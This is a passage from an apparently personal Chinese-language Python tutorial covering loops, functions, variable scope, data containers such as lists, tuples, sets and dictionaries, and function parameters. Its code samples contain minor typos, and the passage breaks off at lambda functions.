title="7.3.3、for循环的零时变量"></a>7.3.3、for循环的零时变量</h4><p>for循环中的零时变量作用域限定为循环内使用<br>如果要规范使用零时变量需要在循环前定义好零时变量</p><p>注意事项：</p><ul><li>非强制限定</li><li>不遵守也能运行，但是不建议这样做</li><li>如果要访问零时变量，可以预先在循环外定义它</li></ul><h3 id="7-4-、for循环嵌套"><a href="#7-4-、for循环嵌套" class="headerlink" title="7.4 、for循环嵌套"></a>7.4 、for循环嵌套</h3><p>语法：<br>使用range序列的方式控制循环次数，或使用数据集</p><pre><code class="python">for i in range(1,101):    print(&quot;i&quot;)    for j in range(1,11)        print(j)</code></pre><p>注意事项：</p><ul><li>和while一样，空格缩进来确定嵌套关系</li><li>也可以和while搭配嵌套使用</li></ul><h3 id="7-5、循环中断-break和continue"><a href="#7-5、循环中断-break和continue" class="headerlink" title="7.5、循环中断(break和continue)"></a>7.5、循环中断(break和continue)</h3><p><strong>continue</strong><br>continue关键字用于：中断本次循环，直接进入下一次</p><p>语句：</p><pre><code class="python">for i in range(1,101):    print(&quot;语句1&quot;)    continue    print(&quot;语句2&quot;)    #直接跳过语句2</code></pre><p><strong>break</strong><br>break关键字用于：直接结束循环</p><p>注意事项：</p><ul><li>continue和break，在for循环和while循环中作用一样</li><li>在嵌套循环中，只能作用在所在循环上，无法对上层循环起到作用</li></ul><h2 id="八、函数"><a href="#八、函数" class="headerlink" title="八、函数"></a>八、函数</h2><p>函数：组织好的、可重复使用的、用来实现特定功能的代码段<br>函数的优点：</p><ul><li>将功能封装在函数内，可供随时随地重复利用</li><li>提高代码的复用性、减少重复代码，提高开发效率</li></ul><h3 id="8-1、函数的基础定义"><a href="#8-1、函数的基础定义" class="headerlink" title="8.1、函数的基础定义"></a>8.1、函数的基础定义</h3><p>语法：</p><pre><code class="python">#函数定义def 函数名(传入参数)    函数体    return 返回值#函数调用函数名(传入参数)#或者接收变量= 函数名(传入参数)    </code></pre><p>定义函数时候提供的参数称之为：形式参数(形参)<br>调用函数时候传入的参数称之为：实际参数(实参)<br>  注意事项：</p><ul><li>定义的参数和返回值可以不写</li><li>定义的参数可以写多个</li><li>函数先定义后使用</li></ul><h3 id="8-2、函数返回值的定义"><a href="#8-2、函数返回值的定义" class="headerlink" title="8.2、函数返回值的定义"></a>8.2、函数返回值的定义</h3><p>函数返回值：函数在执行完成后，返回给调用者的结果<br>语法：</p><pre><code class="python">#函数定义def 函数名(传入参数)    函数体    return 返回值#接收return返回值接收变量 = 函数名(传入参数)</code></pre><p>注意事项：</p><ul><li>函数在遇到return后就结束了，所以写在return后的代码不会执行</li></ul><h3 id="8-3、函数中的None类型"><a href="#8-3、函数中的None类型" class="headerlink" title="8.3、函数中的None类型"></a>8.3、函数中的None类型</h3><p>None作为一个特殊的字面量，用于表示：空、无意义、具有非常多应用场景</p><p>函数中如何返回None：</p><ul><li>函数中如果不写return，则默认返回None</li><li>手动写return None</li></ul><p>应用场景：</p><ul><li>用在函数无返回值上</li><li>用在if判断上<ul><li>在if判断中，None等同于False</li><li>一般用于在函数中主动返回None，配合if判断做相关处理</li></ul></li><li>用于声明无内容的变量上<ul><li>定义变量，但暂时不需要变量有具体值，可以用None来代替</li></ul></li></ul><h3 id="8-4、函数说明文档"><a href="#8-4、函数说明文档" class="headerlink" title="8.4、函数说明文档"></a>8.4、函数说明文档</h3><p>对函数进行说明解释，帮助更好的理解函数功能</p><p>语法:<br>先写完函数体最后在最上方写””” “””并回车，就会自动补充说明格式</p><pre><code class="python">def add(x,y):    &quot;&quot;&quot;   add函数用于将两个值相加并返回结果    :param x:两个数相加的其中一个值    :param y:两个数相加的另一个值    :return:返回两个数相加的结果    &quot;&quot;&quot;    result = x+y    print(f&quot;&#123;x&#125;+&#123;y&#125;=&#123;x+y&#125;&quot;)    return result</code></pre><p>注意事项：</p><ul><li>自动补充函数说明文档格式和查看函数说明文档都是pycharm提供的功能</li><li>先写完函数体，最后在函数最上写””””””就会自动补充说明格式</li><li>查看函数说明文档鼠标悬停在函数体上</li></ul><h3 id="8-5、函数的嵌套应用"><a href="#8-5、函数的嵌套应用" class="headerlink" title="8.5、函数的嵌套应用"></a>8.5、函数的嵌套应用</h3><p>函数的嵌套应用就是定义一个函数时候调用到另外一个函数</p><p>语法：</p><pre><code class="python">def func_a():    print(&quot;---func_a---&quot;)def func_b():    func_a()    print(&quot;---func_b---&quot;)func_b()</code></pre><h3 id="8-6、变量在函数中的作用域"><a href="#8-6、变量在函数中的作用域" class="headerlink" title="8.6、变量在函数中的作用域"></a>8.6、变量在函数中的作用域</h3><p>变量的&#x3D;&#x3D;作用域 #EE3F4D&#x3D;&#x3D;指的是&#x3D;&#x3D;变量作用的范围 #EE3F4D&#x3D;&#x3D;</p><h4 id="8-6-1-局部变量"><a href="#8-6-1-局部变量" class="headerlink" title="8.6.1 局部变量"></a>8.6.1 局部变量</h4><p>定义在函数体内的变量，只在函数体内生效</p><p>示例：</p><pre><code class="python">def testA():    num = 100    print(num)    return numtestA()print(num)#使用函数内变量会提示报错</code></pre><p>注意事项：</p><ul><li>局部变量只在函数体内生效</li></ul><h4 id="8-6-2-全局变量"><a href="#8-6-2-全局变量" class="headerlink" title="8.6.2 全局变量"></a>8.6.2 全局变量</h4><p>在函数内、外都能同时使用的变量<br>全局变量定义：</p><ul><li>函数外定义好变量，就能够作为全局变量</li></ul><p>示例：</p><pre><code class="python">num = 100#全局变量def testA():   #定义函数    print(&quot;函数内：&quot;,num)    return numtestA()   #调用函数print(&quot;函数外：&quot;,num)</code></pre><p>函数不会改变全局变量：</p><pre><code class="python">num = 100def testA():    num = 200    print(&quot;函数中的num=&quot;,num)testA()print(&quot;函数外的num=&quot;,num)</code></pre><p>函数体通过global修改全局变量:</p><pre><code class="python">num = 100def testA():    global num#声明变量    num = 200    print(&quot;函数体内num=&quot;,num)testA()print(&quot;函数体外num=&quot;,num)</code></pre><p>注意事项：</p><ul><li>全局变量可以在函数内外同时使用</li><li>函数内改变全局变量的值，函数外不生效</li><li>要在函数体内修改全局变量可以使用global声明变量</li></ul><h2 id="九、数据容器"><a href="#九、数据容器" class="headerlink" title="九、数据容器"></a>九、数据容器</h2><p>一种可以<code>容纳多份数据</code>的数据类型，容纳的<code>每一份数据称之为1个元素</code>，每一个元素，可以是<code>任意类型</code>的数据，如字符串，数字，布尔等。</p><p>数据容器根据特点的不同，如：</p><ul><li>是否支持重复元素</li><li>是否可以修改</li><li>是否有序，等<br>分为5类，分别是：<br>列表(list)、元组(tuple)、字符串(str)、集合(set)、字典(dict)</li></ul><h3 id="9-1、列表-list"><a href="#9-1、列表-list" class="headerlink" title="9.1、列表(list)"></a>9.1、列表(list)</h3><h4 id="9-1-1、列表的定义语法："><a href="#9-1-1、列表的定义语法：" class="headerlink" title="9.1.1、列表的定义语法："></a>9.1.1、列表的定义语法：</h4><pre><code class="python">#字面量[元素1,元素2,元素3,元素4,...]#定义变量变量名称 = [元素1,元素2,元素3,元素4,...]# 定义空列表变量名称 = []变量名称 = list()# 嵌套定义变量名称= [变量名称1,变量名称2]</code></pre><p>列表内的<code>每一个数据，称之为元素</code></p><ul><li>以[]作为标识 </li><li>列表内每一个元素用，逗号隔开</li></ul><h4 id="9-1-2、列表的特点："><a href="#9-1-2、列表的特点：" class="headerlink" title="9.1.2、列表的特点："></a>9.1.2、列表的特点：</h4><ul><li>可以容纳多个元素（上限为2**63-1、9223372036854775807个）</li><li>可以容纳不同类型的元素(混装)</li><li>数据是有序存储的(有下标序号)</li><li>允许重复数据存在</li><li>可以修改(增加或删除元素等)</li></ul><h4 id="9-1-3、列表的下标-索引"><a href="#9-1-3、列表的下标-索引" class="headerlink" title="9.1.3、列表的下标(索引)"></a>9.1.3、列表的下标(索引)</h4><p>列表的梅一个元素，都有编号称之为下标索引</p><p> 正向索引：</p><ul><li><code>my_list[下标]</code> 从0开始，依次递增，以n-1为结束(n为列表长度)</li></ul><p> 反向索引：</p><ul><li><code>my_list[下标]</code> 从-1开始，依次递减，以-n为结束(n为列表长度)</li></ul><p>示例：</p><pre><code class="python">#定义列表my_list = [&#39;tom&#39;,&#39;any&#39;,&#39;rose&#39;]#正向索引print(my_list[0])print(my_list[1])print(my_list[2])#反向索引print(my_list[-1])print(my_list[-2])print(my_list[-3])</code></pre><p>列表嵌套的索引：</p><ul><li><code>my_list = [[&#39;a1&#39;,&#39;a2&#39;,&#39;a3&#39;],[&#39;b1&#39;,&#39;b2&#39;,&#39;b3&#39;]]</code>my_list[0][0]，第一个括号[0]代表第一个元素，第二个括号[0]代表第一个列表中的第一个元素</li></ul><p>示例：</p><pre><code class="python">#嵌套索引name1=[&#39;Tom&#39;,&#39;Ane&#39;,&#39;Leo&#39;]name2=[&#39;Tom2&#39;,&#39;Ane2&#39;,&#39;Leo2&#39;]name3=[name1,name2]print(name3[0][2])#括号[0]代表第一个列表，[2]代表第一个列表中的第三个元素</code></pre><h4 id="9-1-4、列表的操作（方法）"><a href="#9-1-4、列表的操作（方法）" class="headerlink" title="9.1.4、列表的操作（方法）"></a>9.1.4、列表的操作（方法）</h4><p>列表的操作称为<code>方法</code> </p><blockquote><p>方法：<br>方法和函数功能一样，有传入参数，有返回值，只是方法的使用格式不同<br>定义了一个Student：类<br>方法的使用：<br><code>变量=类.方法(参数1,参数2)</code></p></blockquote><p><strong>插入元素：</strong><br>功能：在指定的下标位置，插入指定的元素<br>语法：<code>列表.insert(下标,元素)</code></p><p><strong>追加元素：</strong><br>追加单个元素:<br>功能：将指定元素，追加到列表尾部<br>语法：<code>列表.append(元素)</code></p><p>追加多个元素：<br>功能：将其它数据容器的内容取出，依次追加到列表尾部<br>语法：<code>列表.extend(其它数据容器)</code></p><p><strong>删除元素：</strong><br>下标指定法：<br>功能：通过指定下标删除列表中的元素<br>语法1：<code>del 列表(下标)</code><br>语法2：<code>列表.pop(下标)</code></p><p>元素匹配法：<br>功能：删除某元素在列表中的第一个匹配项<br>语法：<code>列表.remove(元素)</code></p><p><strong>清空列表：</strong><br>功能：清空列表内容<br>语法：<code>列表.clear()</code></p><p><strong>查找元素：</strong><br>查找某元素的下标<br>功能：查找某元素的下标，如果找不到，报错ValueError<br>语法：<code>列表.index(元素)</code></p><p><strong>统计元素个数:</strong><br>统计某个元素个数：<br>功能：统计某一个元素在列表中的个数<br>语法：<code>列表.count(元素)</code></p><p>统计列表中的所有元素：<br>功能：用len函数统计列表中元素的个数<br>语法：<code>len(列表)</code></p><p><strong>修改元素：</strong><br>功能：修改指定下标的元素<br>语法：<code>列表[下标]=新元素</code></p><h4 id="9-1-5、列表的循环遍历"><a href="#9-1-5、列表的循环遍历" class="headerlink" title="9.1.5、列表的循环遍历"></a>9.1.5、列表的循环遍历</h4><p>while循环和for循环遍历列表，都是循环语句，但细节不同：</p><ul><li><p>在循环控制上：</p><ul><li>while循环<code>可以自定循环条件</code>，并自行控制</li><li>for循环<code>不可以自定循环条件</code>，只可以一个个从容器中取出数据</li></ul></li><li><p>在无限循环上：</p><ul><li>while循环<code>可以</code>通过条件控制做到无限循环</li><li>for循环理论上<code>不可以</code>，因为被遍历的容器容量不是无限的</li></ul></li><li><p>在使用场景上：</p><ul><li>while循环适用于任何想要循环的场景</li><li>for循环适用于，遍历数据容器的场景或简单的固定次数循环场景</li></ul></li></ul><h3 id="9-2、元组-tuple"><a href="#9-2、元组-tuple" class="headerlink" title="9.2、元组(tuple)"></a>9.2、元组(tuple)</h3><p>可以把元组理解为<code>只读的列表</code></p><h4 id="9-2-1、元组的定义格式"><a href="#9-2-1、元组的定义格式" class="headerlink" title="9.2.1、元组的定义格式"></a>9.2.1、元组的定义格式</h4><p>元组的定义：定义元组使用<code>小括号</code>,且使用<code>逗号</code>,隔开各个数据，数据可以是不同的数据类型。</p><pre><code class="python">#定义元组字面量(元素,元素,.....,元素)#定义一个元素的元组变量名称 = (元素,)#定义元组变量变量名称 = (元素,元素,....,元素)#定义空元组变量名称 = ()#方式1变量名称 = tuple()#方式2</code></pre><p>注意事项：<br>    - 只有一个元素的元组带上<code>,</code>号，定义时候也要带上<br>    - 元组和列表本质上一样，只是元组不能篡改内容</p><h4 id="9-2-2、元组的特点"><a href="#9-2-2、元组的特点" class="headerlink" title="9.2.2、元组的特点"></a>9.2.2、元组的特点</h4><p>多数特征和list一样，只是不能修改元素<br>元组的特点：</p><ul><li>可以容纳多个数据</li><li>可以容纳不同的数据(混装)</li><li>数据是有序存储的(下标索引)</li><li>允许重复数据存在</li><li><code>不可以修改</code>(增加或删除元素等)</li><li>元组中嵌套列表(list),不影响修改list</li></ul><h4 id="9-2-3、元组的操作"><a href="#9-2-3、元组的操作" class="headerlink" title="9.2.3、元组的操作"></a>9.2.3、元组的操作</h4><p><strong>查找元素：</strong><br>查找某元素的下标<br>功能：查找某元素的下标，如果找不到，报错ValueError<br>语法：<code>元组.index(元素)</code></p><p><strong>统计元素个数:</strong><br>统计某个元素个数：<br>功能：统计某一个元素在元组中的个数<br>语法：<code>元组.count(元素)</code></p><p><strong>统计列表中的所有元素：</strong><br>功能：用len函数统计元组中元素的个数<br>语法：<code>len(元组)</code></p><h3 id="9-3、字符串-str"><a href="#9-3、字符串-str" class="headerlink" title="9.3、字符串(str)"></a>9.3、字符串(str)</h3><p>字符串同样属于数据容器的一员，<code>字符串是字符的容器</code>，一个字符串可以存放任意数量的字符，<code>每一个字符叫做元素</code></p><h4 id="9-3-1、字符串的下标索引"><a href="#9-3-1、字符串的下标索引" class="headerlink" title="9.3.1、字符串的下标索引"></a>9.3.1、字符串的下标索引</h4><p>和其它容器如：列表、元组一样，字符串同样通过下标访问</p><ul><li>从前先后，下标从0开始</li><li>从后先前，下标从-1开始</li></ul><p>语法：</p><pre><code class="python">name = &quot;tanglx&quot;print(name[0])print(name[-1])</code></pre><h4 id="9-3-2、字符串的特点"><a href="#9-3-2、字符串的特点" class="headerlink" title="9.3.2、字符串的特点"></a>9.3.2、字符串的特点</h4><ul><li>字符串中的元素不可以被修改</li><li>只可以存储字符串</li><li>长度任意（取决于内存）</li><li>支持下标索引</li><li>允许重复字符串存在</li><li>支持for循环</li></ul><h4 id="9-3-3、字符串的操作"><a href="#9-3-3、字符串的操作" class="headerlink" title="9.3.3、字符串的操作"></a>9.3.3、字符串的操作</h4><p><strong>查找元素：</strong><br>查找某元素的下标<br>功能：查找某元素的下标，如果找不到，报错ValueError<br>语法：<code>字符串.index(元素)</code></p><p><strong>统计元素个数:</strong><br>统计某个元素个数：<br>功能：统计某一个元素在字符串中的个数<br>语法：<code>字符串.count(元素)</code></p><p><strong>统计列表中的所有元素：</strong><br>功能：用len函数统计字符串中元素的个数<br>语法：<code>len(字符串)</code></p><p><strong>字符串的替换：</strong><br>替换字符后获得一个新的字符串，不改变原有字符串<br>功能：虽然字符串不能修改元素，但是可以修改并生成新字符串<br>语法：<code>字符串.replace(old字符，new字符)</code></p><p><strong>字符串的分割：</strong><br>字符串本身不变，而是得到一个列表对象<br>功能：按照指定的分隔符字符串，将字符串划分为多个字符串，并存入<code>列表对象</code><br>语法：<code>字符串.split(分隔符字符串)</code></p><p><strong>字符串的规整操作：</strong><br>字符串的规整操作(不传入参数，去首尾空格)<br>语法：<code>字符串.strip()</code></p><p>字符串的规整操作(去首尾指定字符串)<br>语法：<code>字符串.strip(字符串)</code><br>注意：例如传入的”12”,其实是”1”和”2”都会移除，按照单个字符</p><h3 id="9-4、数据容器-序列-的切片"><a href="#9-4、数据容器-序列-的切片" class="headerlink" title="9.4、数据容器(序列)的切片"></a>9.4、数据容器(序列)的切片</h3><h4 id="9-4-1、序列"><a href="#9-4-1、序列" class="headerlink" title="9.4.1、序列"></a>9.4.1、序列</h4><p>序列是指：内容连续、有序，可以使用下标索引的一类数据类型</p><blockquote><p>列表、元组、字符串，均可以视为序列。</p></blockquote><h4 id="9-4-2、序列的操作"><a href="#9-4-2、序列的操作" class="headerlink" title="9.4.2、序列的操作"></a>9.4.2、序列的操作</h4><h5 id="切片："><a href="#切片：" class="headerlink" title="切片："></a>切片：</h5><p>切片：从一个序列中，取出一个子序列(列表，元组，字符串，均支持进行切片操作)</p><p>语法：<code>序列[起始下标:结束下标:步长]</code>&#x3D;&#x3D;取值不包含结束下标 #EE3F4D&#x3D;&#x3D;<br>功能：表示从序列中，从指定位置开始，依次取出元素，到指定位置结束，得到一个新序列</p><ul><li>起始下标表示从何处开始，可以留空，留空则从头开始</li><li>结束下标(不含)表示何处结束，可以留空，留空则截取到结尾</li><li>步长表示，依次取元素的间隔<ul><li>步长1表示，一个个取元素</li><li>步长2表示，每次跳过一个元素</li><li>步长n表示，每次跳过n-1个元素</li><li>步长为负数表示，反向取(注意，起始下标和结束下标也要反向标记)<code>例如:list_1[5:0:-1]</code>例如：<code>list_1[::-1]</code></li></ul></li></ul><h3 id="9-5、集合-set"><a href="#9-5、集合-set" class="headerlink" title="9.5、集合(set)"></a>9.5、集合(set)</h3><p>集合是无序的(不支持下标索引)，且不支持重复元素，但是集合和列表一样，是允许修改的</p><h4 id="9-5-1、集合定义格式"><a href="#9-5-1、集合定义格式" class="headerlink" title="9.5.1、集合定义格式"></a>9.5.1、集合定义格式</h4><p>和列表、元组、字符串定义基本相同：</p><ul><li>列表使用：[]</li><li>元组使用：()</li><li>字符串使用：””</li><li>集合使用：{}</li></ul><p>基本语法：</p><pre><code class="python"># 定义集合字面量&#123;元素,元素,....,元素&#125;#定义变量变量名称 = &#123;元素,元素,...元素&#125;#定义空集合变量名称 = set()</code></pre><h4 id="9-5-2、集合的特点"><a href="#9-5-2、集合的特点" class="headerlink" title="9.5.2、集合的特点"></a>9.5.2、集合的特点</h4><ul><li>不允许重复数据存在</li><li>元素没有下标(无序)</li><li>支持修改</li><li>可以容纳多个数据</li><li>可以容纳不同类型的数据(混装)</li><li>支持for循环</li></ul><h4 id="9-5-3、集合的操作"><a href="#9-5-3、集合的操作" class="headerlink" title="9.5.3、集合的操作"></a>9.5.3、集合的操作</h4><p><strong>添加新元素：</strong><br>功能：将一个指定元素，添加到集合1中(改变集合1)<br>语法：<code>集合1.add(元素)</code></p><p><strong>2个集合合并：</strong><br>功能：将集合1和集合2组合<br>语法：<code>新集合=集合1.unior(集合2)</code><br>示例：</p><pre><code class="python">set1 = &#123;1,2,3&#125;set2 = &#123;1,4,5&#125;set3 = set1.unior(set2)#结果：&#123;1,2,3,4,5&#125;</code></pre><p><strong>移除元素：</strong><br>功能：将指定元素，从集合内移除<br>语法：<code>集合.remove(元素)</code></p><p><strong>清空集合：</strong><br>功能：清空集合<br>语法：<code>集合.clear()</code></p><p><strong>集合的遍历：</strong><br>功能：依次取出元素<br>语法：<code>for x in 元素:</code></p><p><strong>随机取出元素：</strong><br>功能：从集合中随机取出一个元素，取出的元素会从集合中移除<br>语法：<code>集合.pop()</code></p><p><strong>统计元素个数：</strong><br>功能：统计集合中元素个数<br>语法：<code>len(集合)</code></p><p><strong>取出2个集合的差集：</strong><br>功能：取出集合1有集合2没有的元素<br>语法：<code>集合1.difference(集合2)</code></p><p><strong>消除2个集合的共同值：</strong><br>功能：消除集合1内和集合2相同的元素。(改变集合1)<br>语法：<code>集合1.difference_update(集合2)</code></p><h3 id="9-6、字典、映射-dict"><a href="#9-6、字典、映射-dict" class="headerlink" title="9.6、字典、映射(dict)"></a>9.6、字典、映射(dict)</h3><p>字典可以实现基于Key检索Value的场景实现</p><h4 id="9-6-1、字典的定义格式"><a href="#9-6-1、字典的定义格式" class="headerlink" title="9.6.1、字典的定义格式"></a>9.6.1、字典的定义格式</h4><p>字典的定义，同样使用{}，不过存储的元素是一个个的：<code>健值对</code>，如下语法：</p><pre><code class="python">#定义字典字面量&#123;key:value,...,key:value&#125;#定义字典变量my_dict = &#123;key:value,key:value,...,key:value&#125;#定义空字典my_dict = &#123;&#125;my_dict = dict()#获取key中的元素my_dict[key]</code></pre><h4 id="9-6-2、字典的嵌套"><a href="#9-6-2、字典的嵌套" class="headerlink" title="9.6.2、字典的嵌套"></a>9.6.2、字典的嵌套</h4><ul><li>字典的Key和Value可以是任意数据类型(key不可以为字典)</li></ul><pre><code class="python"># 定义嵌套字典my_dict3 = &#123;    10710401:[&quot;leo&quot;,&quot;2002&quot;,&quot;男&quot;,&quot;99&quot;],    10710402:[&quot;tom&quot;,&quot;2002&quot;,&quot;男&quot;,&quot;89&quot;],    10710403:[&quot;alis&quot;,&quot;2001&quot;,&quot;女&quot;,&quot;90&quot;]&#125; </code></pre><h4 id="9-6-3、字典的特点"><a href="#9-6-3、字典的特点" class="headerlink" title="9.6.3、字典的特点"></a>9.6.3、字典的特点</h4><ul><li>字典内key不允许重复(重复会覆盖原有数据)</li><li>健值对的key和Value可以是任意类型(key不以为字典)</li><li>字典不可以通过下标索引，而是通过key索引对应Value值</li><li>可以容纳多个数据</li><li>可以修改(增加或删除更新元素等)</li><li>支持for循环</li></ul><h4 id="9-6-3、字典的操作"><a href="#9-6-3、字典的操作" class="headerlink" title="9.6.3、字典的操作"></a>9.6.3、字典的操作</h4><p><strong>新增元素</strong><br>功能：如果字典中不存在指定key，那么就会新增加<br>语法：<code>字典[new_Key] = Value</code></p><p><strong>更新元素</strong><br>功能：如果字典中存在指定key，那么Vlaue值就会被替换<br>语法：<code>字典[old_Key] = Value</code></p><p><strong>删除元素</strong><br>功能：删除指定字典中的Key<br>语法：<code>字典.pop(Key)</code></p><p><strong>清空字典</strong><br>功能：清空字典<br>语法：<code>字典.clear()</code> </p><p><strong>获取全部Key</strong><br>功能：获取到字典中的全部key(不包含Value)<br>语法：<code>接受变量=字典.keys</code>(获取全部value，用字典.Values)</p><p><strong>统计字典元素数量</strong><br>功能：统计字典元素数量<br>语法：<code>len(字典)</code></p><p><strong>字典的遍历</strong><br>功能：依次遍历key<br>语法：</p><pre><code class="python">test_dict = &#123;key1:Value1,key2:Value2&#125;for x in test_dict:    print(f&quot;&#123;x&#125;=&#123;test_dict[x]&#125;&quot;)</code></pre><h3 id="9-7、数据容器的对比"><a href="#9-7、数据容器的对比" class="headerlink" title="9.7、数据容器的对比"></a>9.7、数据容器的对比</h3><p>数据容器可以从以下视角进行简单的分类：</p><table><thead><tr><th></th><th>列表</th><th>元组</th><th>字符串</th><th>集合</th><th>字典</th></tr></thead><tbody><tr><td>元素数量</td><td>支持多个</td><td>支持多个</td><td>支持多个</td><td>支持多个</td><td>支持多个</td></tr><tr><td>元素类型</td><td>任意</td><td>任意</td><td><code>仅字符</code></td><td>任意</td><td>key:除字典；Value:任意</td></tr><tr><td>下标索引</td><td>支持</td><td>支持</td><td>支持</td><td><code>不支持</code></td><td><code>不支持</code></td></tr><tr><td>重复元素</td><td>支持</td><td>支持</td><td>支持</td><td><code>不支持</code></td><td><code>不支持</code></td></tr><tr><td>可修改性</td><td>支持</td><td><code>不支持</code></td><td><code>不支持</code></td><td>支持</td><td>支持</td></tr><tr><td>数据有序</td><td>是</td><td>是</td><td>是</td><td><code>否</code></td><td><code>否</code></td></tr><tr><td>使用场景</td><td>可以修改、可重复的一批数据记录场景</td><td>不可修改，可重复的一批数据记录场景</td><td>一串字符的记录场景</td><td>不可重复的数据记录场景</td><td>以Key检索Value的数据记录场景</td></tr></tbody></table><p><strong>是否支持下标索引</strong></p><ul><li>支持：列表、元组、字符串 —序列类型</li><li>不支持： 集合、字典 —非序列类型</li></ul><p><strong>是否支持重复元素</strong></p><ul><li>支持：列表、元组、字符串 —序列类型</li><li>不支持： 集合、字典 —非序列类型</li></ul><p><strong>是否可以修改</strong></p><ul><li>支持：列表、集合、字典</li><li>不支持：元组、字符串</li></ul><h3 id="9-8、数据容器的通用操作"><a href="#9-8、数据容器的通用操作" class="headerlink" title="9.8、数据容器的通用操作"></a>9.8、数据容器的通用操作</h3><p>数据容器尽管各自有各自的特点，但是它们也有通用的一些操作。</p><h4 id="9-8-1、遍历"><a href="#9-8-1、遍历" class="headerlink" title="9.8.1、遍历"></a>9.8.1、遍历</h4><p>尽管遍历的形式各有不同，但是，他们都支持遍历操作</p><ul><li>5类数容器都支持for循环遍历</li><li>列表、元组、字符串都支持while循环，集合，字典不支持(无法下标索引)</li></ul><h4 id="9-8-2、数据容器的通用统计功能"><a href="#9-8-2、数据容器的通用统计功能" class="headerlink" title="9.8.2、数据容器的通用统计功能"></a>9.8.2、数据容器的通用统计功能</h4><p>统计容器的元素个数：<br>语法：<code>len(容器)</code></p><p>统计容器的最大元素：<br>语法：<code>max(容器)</code></p><p>统计容器的最小元素：<br>语法: <code>min(容器)</code></p><h4 id="9-8-3、容器的通用转换功能"><a href="#9-8-3、容器的通用转换功能" class="headerlink" title="9.8.3、容器的通用转换功能"></a>9.8.3、容器的通用转换功能</h4><p>将指定容器转换为列表：<br>语法：<code>list()</code></p><p>将指定容器转换为字符串：<br>语法：<code>str()</code></p><p>将指定容器转换为元组：<br>语法：<code>tuple()</code></p><p>将指定容器转换为集合：<br>语法：<code>set()</code></p><h4 id="9-8-3、容器的通用排序功能"><a href="#9-8-3、容器的通用排序功能" class="headerlink" title="9.8.3、容器的通用排序功能"></a>9.8.3、容器的通用排序功能</h4><p>将给定容器进行排序：</p><p>从小到大排序：<br>语法：<code>sorted(容器,[reverse=True])</code></p><p>从大到小排序：<br>语法：<code>sorted(容器,reverse=True)</code></p><h2 id="十、函数的进阶"><a href="#十、函数的进阶" class="headerlink" title="十、函数的进阶"></a>十、函数的进阶</h2><h3 id="10-1、函数的多返回值"><a href="#10-1、函数的多返回值" class="headerlink" title="10.1、函数的多返回值"></a>10.1、函数的多返回值</h3><p>如果一个函数要有多个返回值<br>语法：</p><pre><code class="python">def test_return():    return 1,2    x,y = test_return()#用两个变量接收print(x)#1print(y)#2</code></pre><ul><li>按照返回值的顺序，写对应顺序的多个变量接收接收即可</li><li>变量之间用逗号隔开</li><li>支持不同类型的return</li></ul><h3 id="10-2、函数的多种参数使用形式"><a href="#10-2、函数的多种参数使用形式" class="headerlink" title="10.2、函数的多种参数使用形式"></a>10.2、函数的多种参数使用形式</h3><h4 id="10-2-1、位置参数"><a href="#10-2-1、位置参数" class="headerlink" title="10.2.1、位置参数"></a>10.2.1、位置参数</h4><p>位置参数：调用函数时根据函数定义的<code>参数位置来传递参数</code><br>语法：</p><pre><code class="python">def uesr_info(name,age,gender):    print(f&quot;名字是&#123;name&#125;,年龄是&#123;age&#125;,性别是&#123;gender&#125;&quot;)user_info(&#39;tom&#39;,20,&#39;男&#39;)</code></pre><p>注意事项：</p><ul><li>传递参数和定义的参数的顺序及个数必须一致</li></ul><h4 id="10-2-2-关键字参数"><a href="#10-2-2-关键字参数" class="headerlink" title="10.2.2 关键字参数"></a>10.2.2 关键字参数</h4><p>关键字参数：函数调用时通过 <code>健=值 </code>形式传递参数</p><p>作用：可以让函数更加清晰，容易使用，同时也清除了参数的顺序需求</p><p>语法：</p><pre><code class="python">def uesr_info(name,age,gender):    print(f&quot;名字是&#123;name&#125;,年龄是&#123;age&#125;,性别是&#123;gender&#125;&quot;)#可以不固定位置传入参数user_info(age=20,gender=&quot;男&quot;,name=&quot;小明&quot;)#可以和位置参数混用，位置参数必须在前，且匹配参数顺序user_info(小明,age=20,gender=&quot;男&quot;)</code></pre><p>注意事项:</p><ul><li>函数调用时，如果有位置参数时，位置参数必须在关键字参数的前面，但关键字之间不存在先后顺序</li></ul><h4 id="10-2-3-缺省参数"><a href="#10-2-3-缺省参数" class="headerlink" title="10.2.3 缺省参数"></a>10.2.3 缺省参数</h4><p>缺省参数：缺省参数也叫默认参数，用于定义函数，为参数提供默认值，调用函数时可以不传该默认值</p><p>作用：当调用函数时没有传递参数，就会使用默认是用缺省参数对应的值。</p><p>语法：</p><pre><code class="python">def uesr_info(name,age,gender=&#39;男&#39;):    print(f&quot;名字是&#123;name&#125;,年龄是&#123;age&#125;,性别是&#123;gender&#125;&quot;)#使用默认值user_info(&#39;tom&#39;,20)#不使用默认值user_info(&#39;Rose&#39;,20,&#39;女&#39;)</code></pre><p>注意事项：</p><ul><li>所有位置参数必须出现在默认前，包括函数定义和调用</li></ul><h4 id="10-2-4-不定长参数"><a href="#10-2-4-不定长参数" class="headerlink" title="10.2.4 不定长参数"></a>10.2.4 不定长参数</h4><p>不定长参数：不定长参数也叫可变参数，用于不确定调用的时候会传递多少个参数(不传参也可以)的场景。</p><p>作用：当调用函数时不确定个数时，可以使用不定参数。</p><p>不定长参数的类型：<br>1.位置传递<br>形参使用<code>*</code>号，传入的值作为元组存在<br>语法：</p><pre><code class="python">#不定长参数_位置传递def user_info(*args):    print(f&quot;类型是&#123;type(args)&#125;,值为:&#123;args&#125;&quot;)user_info(18,17,16,18)</code></pre><p>2.关键字传递<br>形参使用<code>**</code>号，传入的值作为字典存在</p><pre><code class="python">#不定长参数_关键字传递def user_info(**kwarg):    print(f&quot;类型是&#123;type(kwarg)&#125;,值为:&#123;kwarg&#125;&quot;)user_info(a1=1,a2=2,a3=3)</code></pre><h3 id="10-3、函数作为参数传递"><a href="#10-3、函数作为参数传递" class="headerlink" title="10.3、函数作为参数传递"></a>10.3、函数作为参数传递</h3><ul><li>函数本身是可以作为参数，传入另一个函数中使用的</li><li>将函数传入的作用在于：传入计算逻辑，而非传入数据</li></ul><p>示例：</p><pre><code class="python">def test_func(compute):    result = compute(1,2)    print(result)def compute(x,y)    return x+ytest_func(compute)</code></pre><h3 id="10-4、lambda匿名函数"><a href="#10-4、lambda匿名函数" class="headerlink" title="10.4、lambda匿名函数"></a>10.4、lambda匿名函数</h3><p>函数定义中</p><ul><li>def关键字，可以定义<code>带有名称</code>的函数</li><li>lambda关键字，可以定义<code>匿名函数</code>(无名称)</li></ul><p>有名称的函数，可以基于名称<code>重复使用</code><br>无名称的匿名函数，只可以<code>零时使用一次</code></p><p>语法：</p><pre><code class="python">lambda 